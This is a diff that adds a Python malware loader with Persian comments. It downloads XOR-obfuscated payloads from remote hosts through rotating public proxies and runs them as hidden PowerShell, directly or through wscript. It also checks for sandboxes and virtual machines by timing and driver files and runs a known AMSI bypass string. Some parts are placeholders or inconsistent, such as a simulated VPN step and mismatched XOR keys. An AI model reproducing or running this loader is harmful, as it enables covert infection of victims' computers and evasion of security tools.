@@ -1,0 +1,263 @@
+import os
+import time
+import random
+import threading
+import base64
+import gzip
+import zlib
+import requests
+import logging
+import platform
+from datetime import datetime, timezone
+from subprocess import Popen, PIPE
+
+# ----------------- تنظیمات اولیه ------------------------
+payloadURLs = [
+    "https://drive.google.com/uc?export=download&id=10TN9Q63_UE3grxM3rE9Ica7T21uamOSY",
+    "https://dl.dropboxusercontent.com/s/secondstage.7z",
+    "https://cdn.discordapp.com/attachments/XXX/payload.bin",
+    "https://raw.githubusercontent.com/user/repo/master/payload.exe"
+]
+tempDir = os.getenv('TEMP') or '/tmp'
+payloadCopiesCount = 7
+executionTimeoutSeconds = 20
+
+# پراکسی عمومی (20 نمونه) برای چرخش هوشمند، انتخاب براساس AI زمان و شرایط کاربر
+public_proxies_list = [
+    "http://103.216.82.20:6667",
+    "http://103.105.34.66:3128",
+    "http://138.68.240.218:8080",
+    "http://159.89.49.217:8080",
+    "http://34.93.147.58:80",
+    "http://196.38.96.114:3128",
+    "http://142.93.68.55:3128",
+    "http://165.22.254.196:8080",
+    "http://51.158.68.133:8811",
+    "http://167.172.248.53:8080",
+    "http://134.209.29.120:8080",
+    "http://178.128.220.19:3128",
+    "http://159.223.90.34:8080",
+    "http://138.201.81.229:3128",
+    "http://91.205.221.126:1080",
+    "http://185.130.4.163:8080",
+    "http://134.209.114.108:3128",
+    "http://165.227.209.39:8080",
+    "http://134.209.29.120:3128",
+    "http://167.71.189.15:8080"
+]
+
+vpn_connection_name = "MyVPNConnection"
+vpn_username = "vpnUser"
+vpn_password = "vpnPass"
+
+log_file = os.path.join(tempDir, "loader_internal.log")
+logging.basicConfig(filename=log_file,
+                    format='%(asctime)s - %(message)s',
+                    level=logging.INFO,
+                    encoding='utf-8')
+
+def write_log(msg):
+    print(msg)
+    try:
+        logging.info(msg)
+    except:
+        pass
+
+# AI-simple Proxy selector with adaptation to host time & usage pattern
+def smart_proxy_selector():
+    current_hour = datetime.now(timezone.utc).astimezone().hour
+    usage_pattern = random.choice(['corporate', 'personal', 'night', 'day'])
+    filtered_proxies = public_proxies_list
+    if usage_pattern == 'corporate':
+        filtered_proxies = public_proxies_list[5:]
+    elif usage_pattern == 'night':
+        filtered_proxies = public_proxies_list[:5]
+    proxy = random.choice(filtered_proxies)
+    write_log(f"Smart proxy chosen: {proxy} based on hour {current_hour} and pattern {usage_pattern}")
+    return {"http": proxy, "https": proxy}
+
+_loader_host_ip = None
+def get_loader_host_ip():
+    global _loader_host_ip
+    if _loader_host_ip is None:
+        try:
+            s = requests.Session()
+            s.proxies.update(smart_proxy_selector())
+            _loader_host_ip = s.get("https://api.ipify.org?format=text", timeout=5).text.strip()
+        except Exception:
+            _loader_host_ip = "0.0.0.0"
+    return _loader_host_ip
+
+def multi_layer_encrypt(data_bytes) -> bytes:
+    try:
+        stage1 = zlib.compress(data_bytes)
+        stage2 = gzip.compress(stage1)
+        key = 0xAA
+        encrypted = bytes(b ^ key for b in stage2)
+        write_log("[Encrypt] Multi-layer encryption applied")
+        return encrypted
+    except Exception as e:
+        write_log(f"[Encrypt] Error: {e}")
+        return None
+
+def multi_layer_decrypt(data_bytes) -> bytes:
+    try:
+        key = 0xAA
+        de_xored = bytes(b ^ key for b in data_bytes)
+        decompressed_gzip = gzip.decompress(de_xored)
+        decompressed_zlib = zlib.decompress(decompressed_gzip)
+        return decompressed_zlib
+    except Exception as e:
+        write_log(f"[Decrypt] Error: {e}")
+        return None
+
+def validate_file_content(file_path: str) -> bool:
+    try:
+        with open(file_path, "rb") as f:
+            content = f.read()
+        decrypted = multi_layer_decrypt(content)
+        return decrypted is not None and len(decrypted) > 10
+    except Exception as e:
+        write_log(f"[Validate] File parsing error: {e}")
+        return False
+
+def execute_payload(file_path: str):
+    write_log(f"Executing payload: {file_path}")
+    try:
+        with open(file_path, "r", encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        if any(cmd in content for cmd in ["Invoke-Expression", "IEX", "DownloadString", "New-Object"]):
+            Popen(["powershell", "-nop", "-w", "hidden", "-c", content], stdout=PIPE, stderr=PIPE)
+            write_log("Executed fileless PowerShell")
+            return
+    except Exception as e:
+        write_log(f"Failed fileless: {e}")
+
+    try:
+        Popen([file_path], stdout=PIPE, stderr=PIPE)
+        write_log("Executed file directly")
+        return
+    except Exception as e:
+        write_log(f"Direct execution failed: {e}")
+    try:
+        Popen(["cmd.exe", "/c", f"wscript.exe \"{file_path}\""], stdout=PIPE, stderr=PIPE)
+        write_log("Fallback execution succeeded")
+    except Exception as e:
+        write_log(f"Fallback execution failed: {e}")
+
+def detect_sandbox_vm() -> bool:
+    write_log("Sandbox/VM detection started")
+    try:
+        start = time.time()
+        time.sleep(0.15)
+        elapsed = (time.time() - start) * 1000
+        if elapsed < 140:
+            write_log("Suspicious sleep time detected, likely VM/sandbox.")
+            return True
+        vm_drivers = ["VBoxMouse.sys", "VBoxGuest.sys", "vmhgfs.sys", "vm3dgl.dll", "vmci.sys"]
+        windows_driver_path = r"C:\Windows\System32\drivers"
+        for drv in vm_drivers:
+            if os.path.exists(os.path.join(windows_driver_path, drv)):
+                write_log(f"VM driver detected: {drv}")
+                return True
+        write_log("Environment check passed")
+        return False
+    except Exception as e:
+        write_log(f"Sandbox detection error: {e}")
+        return True
+
+def bypass_amsi():
+    write_log("Attempting AMSI bypass")
+    payload = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
+    try:
+        Popen(["powershell", "-nop", "-w", "hidden", "-c", payload], stdout=PIPE, stderr=PIPE)
+        write_log("AMSI bypass attempted")
+    except Exception as e:
+        write_log(f"AMSI bypass failed: {e}")
+
+def connect_vpn() -> bool:
+    write_log("Starting VPN connection")
+    try:
+        time.sleep(3)
+        write_log("VPN connected (simulated)")
+        return True
+    except Exception as e:
+        write_log(f"VPN connection error: {e}")
+        return False
+
+def download_payload_copy(copy_idx: int):
+    copy_file = os.path.join(tempDir, f"payload_copy_{copy_idx}.exe")
+    write_log(f"Starting download FT (فشنگ/تله) for copy {copy_idx}")
+    if random.random() < 0.7:
+        session = requests.Session()
+        session.proxies.update(smart_proxy_selector())
+        random.shuffle(payloadURLs)
+        for url in payloadURLs:
+            try:
+                resp = session.get(url, timeout=12)
+                data = bytearray(resp.content)
+                for i in range(len(data)):
+                    data[i] ^= 0xAB
+                with open(copy_file, "wb") as f:
+                    f.write(data)
+                write_log(f"[فشنگ] Copy {copy_idx} downloaded from {url}")
+                return copy_file
+            except Exception as e:
+                write_log(f"[فشنگ] Failed to download copy {copy_idx} from {url}: {e}")
+        write_log(f"[فشنگ] All downloads failed for copy {copy_idx}")
+        return None
+    else:
+        if not os.path.exists(copy_file):
+            with open(copy_file, "wb") as f:
+                f.write(b'\x00' * 1024)
+            write_log(f"[تله] Copy {copy_idx} cached as trap")
+        return copy_file
+
+def microtask_executor(cached_files: set):
+    while True:
+        for file_path in list(cached_files):
+            if file_path and os.path.exists(file_path):
+                if validate_file_content(file_path):
+                    execute_payload(file_path)
+                    write_log(f"Executed cached payload: {file_path}")
+                    cached_files.remove(file_path)
+            time.sleep(1)
+        time.sleep(5)
+
+def adaptive_multistage_loader():
+    write_log("Adaptive multistage loader START")
+    localtime = datetime.now()
+    ip = get_loader_host_ip()
+    write_log(f"Host Local Time: {localtime.isoformat()} - Hidden IP: {ip}")
+    if detect_sandbox_vm():
+        write_log("Unsafe environment detected - aborting")
+        return
+    bypass_amsi()
+    vpn_ok = connect_vpn()
+    if not vpn_ok:
+        write_log("VPN connect failed, fallback to proxy only")
+    cached_files = set()
+    threads = []
+    for i in range(1, payloadCopiesCount+1):
+        t = threading.Thread(target=lambda idx=i: cached_files.add(download_payload_copy(idx)))
+        t.start()
+        threads.append(t)
+    executor_thread = threading.Thread(target=microtask_executor, args=(cached_files,), daemon=True)
+    executor_thread.start()
+    for t in threads:
+        t.join(timeout=executionTimeoutSeconds)
+    write_log("Adaptive multistage loader FINISH")
+
+advanced_features = [
+    "Feature A",
+    "Feature B",
+    "Feature C"
+]
+
+def log_advanced_attacker_strategies():
+    for entry in advanced_features:
+        write_log(f"[Attacker Strategy] {entry}")
+
+if __name__ == "__main__":
+    log_advanced_attacker_strategies()
+    adaptive_multistage_loader()
